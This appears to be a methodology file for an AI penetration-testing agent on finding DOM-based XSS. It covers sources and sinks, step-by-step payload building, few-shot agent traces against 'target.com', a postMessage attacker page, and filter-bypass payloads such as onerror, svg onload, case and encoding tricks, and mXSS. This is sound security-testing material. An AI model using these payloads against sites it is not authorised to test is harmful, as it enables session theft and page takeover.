# DOM-based XSS Testing

## ⚠️ How to Use This File

**Consult this file when:**
- Benign canary is NOT in HTTP response
- But canary appears in rendered page/DOM
- URL fragments (#) affect page content
- JavaScript processes input client-side

**Key difference from Reflected/Stored:** The payload never touches the server. All processing is client-side. Different methodology required.

---

## When to Suspect DOM XSS

- Benign canary is NOT in HTTP response body
- But canary appears in the rendered page or DOM
- URL contains fragments (`#`) that affect page content
- JavaScript processes query parameters client-side
- Page behavior changes based on URL without server requests

## DOM XSS Testing Methodology

### Step 1: Identify Sources

Sources are locations where attacker-controlled data enters JavaScript.

**URL-based Sources:**
```
location.href           // Full URL
location.hash           // Fragment (#value)
location.search         // Query string (?param=value)
location.pathname       // URL path
document.URL            // Full URL
document.documentURI    // Full URL
document.referrer       // Referrer header value
```

**Other Sources:**
```
window.name             // Persists across navigations
postMessage             // Cross-origin messages
document.cookie         // Cookie values
localStorage/sessionStorage
```

**How to identify:** Search JavaScript for these patterns, or use browser DevTools to set breakpoints on property access.

### Step 2: Identify Sinks

Sinks are dangerous functions where data is used in ways that can execute code.

**HTML Injection Sinks (execute HTML/JS):**
```javascript
element.innerHTML = data
element.outerHTML = data
document.write(data)
document.writeln(data)
element.insertAdjacentHTML(position, data)
```

**JavaScript Execution Sinks:**
```javascript
eval(data)
setTimeout(data, ...)      // When first arg is string
setInterval(data, ...)     // When first arg is string
Function(data)
```

**URL/Navigation Sinks:**
```javascript
location = data
location.href = data
location.assign(data)
location.replace(data)
window.open(data)
element.src = data         // For script, iframe
element.href = data        // For a, link
```

**jQuery Sinks (if jQuery present):**
```javascript
$(data)                    // Selector injection
.html(data)
.append(data)
.prepend(data)
.after(data)
.before(data)
```

### Step 3: Trace Data Flow

Once you identify a potential source-sink pair:

1. **Set breakpoints** on the source (e.g., where `location.hash` is read)
2. **Input a unique canary** in the source
3. **Step through** to see how data flows
4. **Identify transformations** — is there sanitization? Encoding? Decoding?
5. **Determine if canary reaches sink** unchanged or modified

### Step 4: Analyze Sanitization

If sanitization exists between source and sink:

- **What does it filter?** Test individual characters
- **Does it encode or strip?** Different bypass strategies
- **Is it applied correctly?** Common mistakes:
  - Sanitizing after decoding (double-decode bypass)
  - Incomplete regex patterns
  - Only checking for specific strings

### Step 5: Build Payload Incrementally

Same principle as reflected XSS — build piece by piece.

**For innerHTML sink:**
```
Step 1: test<           → appears in DOM?
Step 2: test<img        → appears in DOM?
Step 3: test<img src    → appears in DOM?
... continue incrementally
```

**For eval sink:**
```
Step 1: test;           → code executes without error?
Step 2: test;func       → still works?
Step 3: test;func(      → still works?
... continue incrementally
```

### Step 6: Payload Format by Sink Type

**innerHTML / document.write sinks:**
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

**eval / setTimeout(string) sinks:**
```javascript
alert(1)
';alert(1)//
");alert(1)//
```

**location / href sinks:**
```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

**jQuery selector sink $(...):**
```html
<img src=x onerror=alert(1)>
```

---

## Few-Shot Examples

### Example 1: location.hash to innerHTML

**SCENARIO:** Page URL is `https://target.com/page#default`. Changing the hash changes displayed content.

**THINKING:** The hash fragment affects the page without a server request. This suggests client-side processing. Let me check if my input reaches the DOM.

**ACTION:** Navigate to `https://target.com/page#xsstest123`

**RESULT:** Page displays "xsstest123" somewhere. Not in HTTP response (verified via proxy), but visible on page.

**THINKING:** Confirmed DOM XSS potential. Input from `location.hash` reaches the DOM. Now I need to find the sink. Let me check page source for JavaScript that reads location.hash.

**ACTION:** Search page JavaScript for "location.hash" or "hash"

**RESULT:** Found: `document.getElementById('content').innerHTML = decodeURIComponent(location.hash.slice(1));`

**THINKING:** Source is `location.hash`, sink is `innerHTML`. The code does `decodeURIComponent` then directly assigns to innerHTML. No sanitization! Let me test incrementally.

**ACTION:** Navigate to `https://target.com/page#test<`

**RESULT:** DOM shows `test<` — less-than survives.

**ACTION:** Navigate to `https://target.com/page#<img`

**RESULT:** DOM contains `<img` — tag start works.

**ACTION:** Navigate to `https://target.com/page#<img src=x onerror=alert(1)>`

**RESULT:** Alert fires! 

**CONCLUSION:** Direct DOM XSS via location.hash → innerHTML. No sanitization. Working payload: `#<img src=x onerror=alert(1)>`

---

### Example 2: Query Parameter with Partial Sanitization

**SCENARIO:** Page at `https://target.com/search?q=test` displays search term dynamically.

**THINKING:** Let me check if input appears in HTTP response or only in DOM.

**ACTION:** Request `https://target.com/search?q=xsstest456` and examine response.

**RESULT:** HTTP response contains `<div id="results"></div>` but NOT "xsstest456". However, rendered page shows "xsstest456".

**THINKING:** Confirmed: input processed client-side. Let me find the JavaScript.

**ACTION:** Search JavaScript for "location.search" or query parameter parsing.

**RESULT:** Found:
```javascript
var params = new URLSearchParams(location.search);
var query = params.get('q');
var sanitized = query.replace(/<script>/gi, '').replace(/<\/script>/gi, '');
document.getElementById('results').innerHTML = 'Results for: ' + sanitized;
```

**THINKING:** There's sanitization, but it only removes `<script>` and `</script>` tags. It doesn't block other tags or event handlers. Classic incomplete sanitization!

**ACTION:** Navigate to `https://target.com/search?q=<img src=x onerror=alert(1)>`

**RESULT:** Alert fires!

**CONCLUSION:** Sanitization only blocks script tags. Other HTML elements with event handlers work fine. Working payload: `?q=<img src=x onerror=alert(1)>`

---

### Example 3: postMessage Handler Vulnerability

**SCENARIO:** Target page receives messages from other windows.

**THINKING:** postMessage can be a source for DOM XSS if the handler doesn't validate message origin or sanitize data.

**ACTION:** Search JavaScript for "addEventListener" with "message" or "onmessage".

**RESULT:** Found:
```javascript
window.addEventListener('message', function(e) {
    // No origin check!
    document.getElementById('widget').innerHTML = e.data.html;
});
```

**THINKING:** No origin validation and direct innerHTML assignment. I can send a message from my own page to exploit this.

**ACTION:** Create attacker page:
```html
<script>
var target = window.open('https://target.com/page');
setTimeout(function() {
    target.postMessage({html: '<img src=x onerror=alert(document.domain)>'}, '*');
}, 2000);
</script>
```

**RESULT:** After opening target and sending message, alert shows target's domain.

**CONCLUSION:** postMessage handler accepts messages from any origin and passes data directly to innerHTML. Working exploit requires opening target page and sending crafted message.

---

## Common DOM XSS Patterns

### URL Fragment Injection
```
Source: location.hash
URL: https://target.com/page#<payload>
```

### Query Parameter Processing
```
Source: location.search / URLSearchParams
URL: https://target.com/page?param=<payload>
```

### document.referrer Injection
```
Source: document.referrer
Attack: Link from page with malicious URL to target
```

### window.name Persistence
```
Source: window.name
Attack: Set window.name on attacker page, navigate to target
```

### postMessage Exploitation
```
Source: message event data
Attack: Open target in window/iframe, send malicious message
```

---

## Debugging Techniques

### Browser DevTools

1. **Sources tab:** Set breakpoints on sink functions
2. **Console:** Monitor for errors during payload testing
3. **Elements tab:** Watch DOM changes in real-time

### DOM Breakpoints

Right-click element → "Break on" → "Subtree modifications"
This triggers debugger when innerHTML etc. modifies the element.

### Overriding Dangerous Functions

Temporarily override to log calls:
```javascript
var originalWrite = document.write;
document.write = function(x) {
    console.log('document.write called with:', x);
    return originalWrite.apply(document, arguments);
};
```

---

## Sanitization Bypass Techniques

### Incomplete Tag Filtering
If only `<script>` blocked:
```html
<img src=x onerror=...>
<svg onload=...>
```

### Case Sensitivity
If filter is case-sensitive:
```html
<ScRiPt>...</sCrIpT>
<IMG SRC=x ONERROR=...>
```

### Encoded Payloads
If data is decoded after sanitization:
```
%3Cimg%20src=x%20onerror=alert(1)%3E
```

### Breaking Regex Patterns
If regex expects specific format:
```html
<img/src=x onerror=...>    (slash instead of space)
<img	src=x onerror=...>   (tab instead of space)
```

### Mutation-based (mXSS)
Browser parsing differences:
```html
<p id="</p><img src=x onerror=alert(1)>">
```

---

## Output Format

When reporting DOM XSS findings:

```
DOM XSS FINDING
===============
SOURCE: [location.hash | location.search | postMessage | etc.]
SINK: [innerHTML | eval | location.href | etc.]
DATA FLOW: [description of how data flows from source to sink]
SANITIZATION: [none | partial (describe) | bypassable (describe)]
PAYLOAD: [working payload]
TRIGGER: [URL | attacker page required | user action required]
IMPACT: [same as reflected XSS - cookie access, etc.]
```
